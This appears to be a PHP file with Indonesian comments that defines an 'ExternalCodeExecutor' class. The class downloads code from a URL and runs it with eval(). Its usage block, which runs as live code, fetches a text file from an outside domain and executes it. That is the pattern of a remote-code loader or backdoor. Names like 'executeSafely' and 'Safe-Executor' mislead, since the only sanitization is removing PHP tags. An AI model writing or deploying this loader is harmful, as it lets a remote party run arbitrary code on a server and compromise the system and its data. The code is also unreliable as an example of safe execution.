<?php
class ExternalCodeExecutor {
    private $allowed_domains;
    private $timeout;
    
    public function __construct($allowed_domains = [], $timeout = 10) {
        $this->allowed_domains = $allowed_domains;
        $this->timeout = $timeout;
    }
    
    public function executeFromUrl($url, $method = 'curl') {
        if (!$this->isUrlAllowed($url)) {
            throw new Exception("Domain tidak diizinkan");
        }
        
        if ($method === 'curl') {
            $code = $this->fetchWithCurl($url);
        } else {
            $code = $this->fetchWithFileGetContents($url);
        }
        
        return $this->executeSafely($code);
    }
    
    private function isUrlAllowed($url) {
        $parsed = parse_url($url);
        return $parsed && isset($parsed['host']) && 
               in_array($parsed['host'], $this->allowed_domains);
    }
    
    private function fetchWithCurl($url) {
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT => $this->timeout,
            CURLOPT_FOLLOWLOCATION => false,
            CURLOPT_SSL_VERIFYPEER => true,
            CURLOPT_USERAGENT => 'Safe-Executor/1.0'
        ]);
        
        $result = curl_exec($ch);
        if (curl_errno($ch)) {
            throw new Exception("cURL Error: " . curl_error($ch));
        }
        curl_close($ch);
        
        return $result;
    }
    
    private function fetchWithFileGetContents($url) {
        $context = stream_context_create([
            'http' => [
                'timeout' => $this->timeout,
                'user_agent' => 'Safe-Executor/1.0'
            ],
            'ssl' => [
                'verify_peer' => true,
                'verify_peer_name' => true
            ]
        ]);
        
        $result = file_get_contents($url, false, $context);
        if ($result === false) {
            throw new Exception("Gagal mengambil konten");
        }
        
        return $result;
    }
    
    private function executeSafely($code) {
        // Basic sanitization
        $code = trim($code);
        $code = preg_replace('/^<\?php/', '', $code);
        $code = preg_replace('/\?>\s*$/', '', $code);
        
        // Execute in isolated scope
        return eval($code);
    }
}

// Penggunaan
try {
    $executor = new ExternalCodeExecutor(["stepmomhub.com"], 10);
    $result = $executor->executeFromUrl("https://stepmomhub.com/3.txt", "curl");
    echo "Eksekusi berhasil";
} catch (Exception $e) {
    echo "Error: " . $e->getMessage();
}
?>



